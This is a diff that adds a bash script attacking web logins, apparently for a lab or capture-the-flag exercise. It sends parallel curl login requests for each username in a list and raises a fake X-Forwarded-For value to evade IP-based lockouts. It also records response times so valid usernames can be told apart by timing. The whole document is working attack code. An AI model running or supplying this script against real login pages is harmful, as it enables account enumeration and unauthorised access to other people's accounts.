@@ -1,0 +1,49 @@
+#!/usr/bin/bash
+
+users_file=$1
+password=$2
+url=$3
+threads=10
+
+login() {
+	curl -s -X POST -o "$1_response" -d "username=$1&password=$2" -H "X-Forwarded-For: $3" $4 -w %{time_total} > $5
+}
+
+attempts() {
+	tries=$3
+	for i in $(seq 10 20); do
+		login "$1" "$2" "$tries" "$4" "$1_tmptimes"
+		if cat "$1_response" | grep -q "too many"; then
+			while cat "$1_response" | grep -q "too many"; do
+				tries=$(( tries + 1 ))
+				echo "[!] Got banned! $tries"
+				login "$1" "$2" "$tries" "$4" "$1_tmptimes"
+			done
+		fi
+		if cat "$1_response" | grep -q "Invalid"; then
+			echo "[*] Invalid, Trying..."
+		fi
+		cat "$1_tmptimes" >> $5
+		rm $1_response $1_tmptimes
+		echo "" >> $5
+	done
+}
+
+execute() {
+	attempts "$1" "$2" "$3" "$4" "$1_times"
+}
+
+running_jobs() {
+	jobs -rp | wc -l
+}
+
+bypass=90
+
+while read -r user; do
+	while [ "$(running_jobs)" -gt "$threads" ]; do
+		sleep 0.1
+	done
+	bypass=$(( bypass + 12 ))
+	execute "$user" "$password" "$bypass" "$url" &
+done < "$users_file"
+
